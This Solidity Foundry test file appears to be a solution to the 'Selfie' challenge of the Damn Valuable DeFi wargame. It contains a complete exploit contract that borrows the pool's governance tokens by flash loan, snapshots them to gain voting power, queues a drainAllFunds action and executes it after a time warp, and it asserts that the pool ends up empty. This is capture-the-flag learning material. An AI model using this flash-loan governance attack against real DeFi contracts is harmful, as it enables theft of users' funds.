// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";

contract SelfieAttacker {
    SelfiePool public selfiePool;
    SimpleGovernance public simpleGovernance;
    DamnValuableTokenSnapshot public governanceToken;
    address public owner;
    uint256 public savedActionId;

    constructor(
        SelfiePool _selfiePool,
        SimpleGovernance _simpleGovernance,
        DamnValuableTokenSnapshot _governanceToken
    ) {
        selfiePool = _selfiePool;
        simpleGovernance = _simpleGovernance;
        governanceToken = _governanceToken;
        owner = msg.sender;
    }

    function attack() public {
        console2.log("attack entered");
        uint256 flashLoanBalance = governanceToken.balanceOf(address(selfiePool));
        selfiePool.flashLoan(flashLoanBalance);
        console2.log("attack ended");
    }

    function attack2() public {
        simpleGovernance.executeAction(savedActionId);
    }

    function receiveTokens(address token, uint256 borrowAmount) external {
        console2.log("receive tokens entered");
        // get a snapshot
        uint256 snapshotId = governanceToken.snapshot();
        console2.log("snapshotId:", snapshotId);
        //prepare data payload
        bytes memory attackingData = abi.encodeWithSignature("drainAllFunds(address)", owner);
        //receiver needs to be selfie pool,
        // data is attackingData,
        // weiAmount is ether, we don't need ether. put ZERO
        savedActionId = simpleGovernance.queueAction(address(selfiePool), attackingData, 0);
        //return it
        governanceToken.transfer(address(selfiePool), borrowAmount);
    }
}

contract Selfie is Test {
    uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;

    Utilities internal utils;
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvtSnapshot;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];

        vm.label(attacker, "Attacker");

        dvtSnapshot = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        vm.label(address(dvtSnapshot), "DVT");

        simpleGovernance = new SimpleGovernance(address(dvtSnapshot));
        vm.label(address(simpleGovernance), "Simple Governance");

        selfiePool = new SelfiePool(
            address(dvtSnapshot),
            address(simpleGovernance)
        );

        dvtSnapshot.transfer(address(selfiePool), TOKENS_IN_POOL);

        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        vm.startPrank(attacker);
        SelfieAttacker attackingContract = new SelfieAttacker(selfiePool, simpleGovernance, dvtSnapshot);
        attackingContract.attack();
        vm.warp(block.timestamp + 2 days);
        attackingContract.attack2();

        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
    }
}
